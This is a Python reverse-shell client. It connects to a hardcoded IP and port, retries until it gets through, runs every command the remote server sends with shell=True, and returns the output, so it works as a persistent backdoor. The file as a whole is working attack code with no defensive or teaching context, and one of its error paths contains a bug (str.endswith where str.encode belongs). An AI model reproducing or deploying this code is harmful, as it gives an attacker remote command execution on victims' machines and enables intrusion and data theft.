import os
import socket
import subprocess
import time

# Create A Socket
def create_socket():
	try:
		global host
		global s
		global port
		host = "192.168.0.102"
		port = 9999
		s = socket.socket()
	except socket.error as msg:
		print("ERROR IN CREATING SOCKET : " + str(msg))
	
# Connect To A Remote Socket
def connect_socket():
	try:
		global host
		global port
		global s
		s.connect((host, port))
	except socket.error as msg:
		print("ERROR IN SOCKET CONNECTION : " + str(msg))
		time.sleep(5)
		connect_socket()


# Receive Commands From Remote Server And Run On Local Machine
def receive_commands():
	while True:
		data = s.recv(20480)
		if data[:2].decode("utf-8") == "cd":
			try:
				os.chdir(data[3:].decode("utf-8"))
				output_str = str(os.getcwd()) + ">"
				s.send(str.encode(output_str))
			except:
				pass
		if data[:].decode("utf-8") == "quit":
			s.close()
			break
		if len(data) > 0:
			try:
				cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				output_bytes = cmd.stdout.read() + cmd.stderr.read()
				output_str = str(output_bytes, "utf-8")
				s.send(str.encode(output_str + str(os.getcwd()) + ">"))
				print(output_str)
			except:
				output_str = "COMMAND CAN NOT BE RECOGNISED\n"
				s.send(str.endswith(output_str + str(os.getcwd()) + ">"))
				print(output_str)
	s.close()
	
# Main
def main():
	global s
	try:
		create_socket()
		connect_socket()
		receive_commands()
	except:
		print("ERROR IN MAIN")
		time.sleep(5)
	s.close()
	main()

main()
	
